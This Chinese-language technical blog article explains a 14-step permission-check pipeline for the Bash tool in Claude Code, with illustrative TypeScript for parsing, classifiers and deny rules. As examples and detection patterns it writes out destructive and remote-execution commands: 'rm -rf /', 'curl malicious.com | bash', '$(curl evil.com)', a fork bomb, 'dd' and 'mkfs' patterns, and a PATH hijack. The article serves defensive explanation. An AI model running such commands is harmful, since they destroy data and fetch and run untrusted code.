---
title: "Bash 命令安全：14 步检查流程"
description: "export PATH=/malicious:$PATH"
publishDate: 2024-05-16
order: 3
readingTime: "31 min"
---

Bash 工具是 Claude Code 最危险的工具，权限检查代码超过 2600 行。本篇详细分析 14 步检查流程。

## 为什么 Bash 最复杂？

Bash 可以执行**任何命令**：

```bash
# 安全命令
git status
npm test

# 危险命令
rm -rf /
curl malicious.com | bash
eval '$(curl evil.com)'
git push --force origin main
```

无法用简单的规则匹配，需要**语义级分析**。

## 14 步检查流程

### 流程图

```
输入命令
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 1：AST 安全解析                                          │
│ 使用 tree-sitter 解析命令，检测语法错误                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 2：复杂命令处理                                           │
│ 处理命令替换 $()、控制流 if/while、管道                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 3：语义级检查                                             │
│ 检测 zsh builtins、eval、exec 等危险语义                       │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 4：沙箱自动允许检查                                        │
│ 如果在沙箱中运行，某些命令自动允许                              │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 5：Bash classifier 并行检查                               │
│ 同时调用 deny 和 ask 分类器                                    │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 6：命令操作符检查                                          │
│ 检查管道 |、重定向 >、后台 & 等                                 │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 7：传统安全检查                                            │
│ 检查 rm -rf、curl | bash 等经典危险模式                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 8：命令分割 + cd 过滤                                      │
│ 分割多命令，过滤 cd 命令                                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 9：子命令数限制                                            │
│ 限制最多执行的子命令数量                                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 10：多 cd 命令检查                                         │
│ 不允许多个 cd 命令（可能导致意外路径）                          │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 11：cd + git 组合检查                                      │
│ 防止 bare repo RCE（git 安全漏洞）                             │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 12：子命令权限检查                                         │
│ 对每个子命令递归检查                                            │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 13：路径约束检查                                           │
│ 检查路径是否在允许范围内                                        │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ 步骤 14：最终决策                                              │
│ 综合所有检查结果，做出最终决策                                  │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
执行命令 / 显示对话框 / 拒绝
```

## 步骤详解

### 步骤 1：AST 安全解析

使用 tree-sitter 解析 Bash 语法：

```typescript
import Parser from 'tree-sitter-bash'

function parseBashCommand(command: string): ParseResult {
  const parser = new Parser()
  const tree = parser.parse(command)

  if (tree.rootNode.hasError) {
    // 语法错误，可能是恶意构造
    return {
      valid: false,
      error: 'Bash syntax error',
      node: tree.rootNode,
    }
  }

  return {
    valid: true,
    tree,
    commands: extractCommands(tree),
  }
}
```

**检测示例**：

```bash
# 语法正常
git status        # ✓

# 语法异常（可能是注入）
git status; rm -rf / && echo 'ok'    # 检测到多个命令
$(curl evil.com)                     # 检测到命令替换
```

### 步骤 2：复杂命令处理

处理 Bash 的复杂结构：

**命令替换**：

```typescript
// 检测 $() 或 ``
function checkCommandSubstitution(tree: Tree): boolean {
  const substitutions = findNodes(tree, 'command_substitution')

  for (const sub of substitutions) {
    // 命令替换内的命令也需要检查
    const innerCommand = sub.childForFieldName('child')
    const innerCheck = checkBashCommand(innerCommand.text)

    if (innerCheck.deny) {
      return false
    }
  }

  return true
}
```

**控制流**：

```typescript
// 检测 if/while/for
function checkControlFlow(tree: Tree): boolean {
  const controlFlows = findNodes(tree, ['if_statement', 'while_statement', 'for_statement'])

  // 控制流内的每个分支都要检查
  for (const cf of controlFlows) {
    const bodyCommands = extractCommandsFromBody(cf)
    for (const cmd of bodyCommands) {
      if (isDangerous(cmd)) return false
    }
  }

  return true
}
```

### 步骤 3：语义级检查

检测危险语义：

```typescript
const DANGEROUS_BUILTINS = new Set([
  'eval',      // 执行任意代码
  'exec',      // 替换进程
  'source',    // 执行脚本
  '.',         // 同 source
  'alias',     // 定义别名
  'function',  // 定义函数
])

const ZSH_DANGEROUS_BUILTINS = new Set([
  'autoload',
  'bindkey',
  'zle',
])

function checkSemantics(tree: Tree): CheckResult {
  for (const node of traverse(tree)) {
    const commandName = getCommandName(node)

    if (DANGEROUS_BUILTINS.has(commandName)) {
      return {
        deny: true,
        reason: `Dangerous builtin: ${commandName}`,
      }
    }

    // 检测 zsh builtins（如果 shell 是 zsh）
    if (shell === 'zsh' && ZSH_DANGEROUS_BUILTINS.has(commandName)) {
      return {
        deny: true,
        reason: `Zsh dangerous builtin: ${commandName}`,
      }
    }
  }

  return { deny: false }
}
```

### 步骤 4：沙箱自动允许

沙箱模式下，某些命令自动允许：

```typescript
const AUTO_ALLOW_IN_SANDBOX = [
  'git',
  'npm',
  'node',
  'bun',
  'python',
  'pytest',
]

function checkSandboxAutoAllow(command: string, inSandbox: boolean): boolean {
  if (!inSandbox) return false

  const cmdName = command.split(' ')[0]
  return AUTO_ALLOW_IN_SANDBOX.includes(cmdName)
}
```

### 步骤 5：分类器并行检查

同时调用两个分类器：

```typescript
async function runClassifiers(command: string, cwd: string): Promise<ClassifierResult> {
  // 并行调用 deny 和 ask 分类器
  const [denyResult, askResult] = await Promise.all([
    classifyBashCommand(command, cwd, true, 'deny'),
    classifyBashCommand(command, cwd, true, 'ask'),
  ])

  // deny 分类器优先
  if (denyResult.classification === 'deny' && denyResult.confidence > 0.9) {
    return { deny: true, reason: denyResult.reason }
  }

  // ask 分类器其次
  if (askResult.classification === 'ask' && askResult.confidence > 0.9) {
    return { ask: true, reason: askResult.reason }
  }

  return { undecided: true }
}
```

### 步骤 6：命令操作符检查

检查危险操作符：

```typescript
const DANGEROUS_OPERATORS = {
  '|': 'pipe',           // 管道
  '>': 'redirect',       // 重定向（可能覆盖文件）
  '>>': 'append',        // 追加
  '2>&1': 'stderr',      // stderr 重定向
  '&': 'background',     // 后台执行
  '&&': 'and',           // 条件执行
  '||': 'or',            // 条件执行
}

function checkOperators(command: string): CheckResult {
  // 检测重定向到敏感文件
  const redirectMatch = command.match(/>\s*(\/[^'']*)/)
  if (redirectMatch) {
    const target = redirectMatch[1]
    if (isSensitivePath(target)) {
      return {
        deny: true,
        reason: `Redirect to sensitive path: ${target}`,
      }
    }
  }

  // 检测后台执行
  if (command.includes('&') && !command.includes('&&')) {
    // 后台执行需要确认
    return {
      ask: true,
      reason: 'Background execution',
    }
  }

  return { deny: false }
}
```

### 步骤 7：传统安全检查

检查经典危险模式：

```typescript
const DANGEROUS_PATTERNS = [
  { pattern: /rm\s+-rf\s+\//, reason: 'Recursive delete from root' },
  { pattern: /rm\s+-rf\s+\*/, reason: 'Recursive delete all' },
  { pattern: /curl.*\|\s*bash/, reason: 'Remote code execution' },
  { pattern: /wget.*\|\s*sh/, reason: 'Remote code execution' },
  { pattern: /:(){ :|:& };:/, reason: 'Fork bomb' },
  { pattern: /mkfs/, reason: 'Format filesystem' },
  { pattern: /dd\s+if=/, reason: 'Disk manipulation' },
  { pattern: />\s*\/dev\/sda/, reason: 'Disk overwrite' },
  { pattern: /chmod\s+-R\s+777\s+\//, reason: 'Change all permissions' },
  { pattern: /git\s+push\s+--force\s+.*main|master/, reason: 'Force push to main' },
]

function checkDangerousPatterns(command: string): CheckResult {
  for (const { pattern, reason } of DANGEROUS_PATTERNS) {
    if (pattern.test(command)) {
      return { deny: true, reason }
    }
  }

  return { deny: false }
}
```

### 步骤 8：命令分割

分割多命令：

```typescript
function splitCommands(command: string): string[] {
  // 分割 ; 和 && ||
  const commands = command.split(/[;&|]+/)

  // 过滤空命令
  return commands.filter(c => c.trim().length > 0)
}
```

### 步骤 9-11：cd 相关检查

cd 命令有特殊风险：

```typescript
// 步骤 9：子命令数限制
if (commands.length > 20) {
  return { deny: true, reason: 'Too many subcommands (max 20)' }
}

// 步骤 10：多 cd 检查
const cdCommands = commands.filter(c => c.startsWith('cd '))
if (cdCommands.length > 1) {
  return { ask: true, reason: 'Multiple cd commands' }
}

// 步骤 11：cd + git 组合（bare repo RCE）
const hasCd = commands.some(c => c.startsWith('cd '))
const hasGit = commands.some(c => c.startsWith('git '))
if (hasCd && hasGit) {
  // 检查是否 cd 到 bare repo
  const cdTarget = cdCommands[0].replace('cd ', '').trim()
  if (isBareRepo(cdTarget)) {
    return { deny: true, reason: 'Bare repo RCE risk' }
  }
}
```

### 步骤 12：子命令权限检查

对每个子命令递归检查：

```typescript
async function checkSubcommands(commands: string[]): Promise<CheckResult> {
  for (const cmd of commands) {
    // 递归检查
    const result = await checkBashCommand(cmd)

    if (result.deny) {
      return { deny: true, reason: `Subcommand denied: ${result.reason}` }
    }

    if (result.ask) {
      return { ask: true, reason: `Subcommand needs approval: ${result.reason}` }
    }
  }

  return { deny: false }
}
```

### 步骤 13：路径约束检查

检查路径是否在允许范围：

```typescript
function checkPathConstraints(command: string, cwd: string, allowedPaths: string[]): CheckResult {
  // 提取命令中的路径
  const paths = extractPaths(command)

  for (const path of paths) {
    const resolved = resolve(path, cwd)

    // 检查是否在允许范围内
    const isAllowed = allowedPaths.some(allowed => {
      return resolved.startsWith(allowed)
    })

    if (!isAllowed) {
      return {
        ask: true,
        reason: `Path outside allowed scope: ${path}`,
      }
    }
  }

  return { deny: false }
}
```

### 步骤 14：最终决策

综合所有检查：

```typescript
function makeFinalDecision(results: CheckResult[]): PermissionResult {
  // 任一 deny → 拒绝
  if (results.some(r => r.deny)) {
    const denyResult = results.find(r => r.deny)
    return {
      behavior: 'deny',
      message: denyResult.reason,
    }
  }

  // 任一 ask → 询问
  if (results.some(r => r.ask)) {
    const askResult = results.find(r => r.ask)
    return {
      behavior: 'ask',
      message: askResult.reason,
    }
  }

  // 全部通过 → 允许
  return { behavior: 'allow' }
}
```

## 环境变量安全

Bash 执行时的环境变量控制：

### 白名单设计

```typescript
const SAFE_ENV_VARS = new Set([
  // 语言运行时
  'GOEXPERIMENT', 'GOOS', 'GOARCH',
  'RUST_BACKTRACE', 'RUST_LOG',
  'NODE_ENV',
  'PYTHONUNBUFFERED',

  // 系统环境
  'LANG', 'TERM', 'TZ',

  // Claude 相关
  'ANTHROPIC_API_KEY',
])

// 永不信任的变量（危险）
const NEVER_TRUST_VARS = new Set([
  'PATH',           // 执行劫持
  'LD_PRELOAD',     // 动态链接劫持
  'PYTHONPATH',     // Python 模块加载劫持
  'NODE_PATH',      // Node 模块加载劫持
  'NODE_OPTIONS',   // Node 执行劫持
  'GOFLAGS',        // Go 执行劫持
])
```

**原因**：`PATH` 劫持可以替换命令：

```bash
# 攻击者设置
export PATH=/malicious:$PATH

# 用户执行
git status

# 实际执行
/malicious/git status  # 恶意版本
```

## 下篇预告

下一篇，我们将深入文件操作安全——看看 Read-First 规则如何防止意外覆盖。
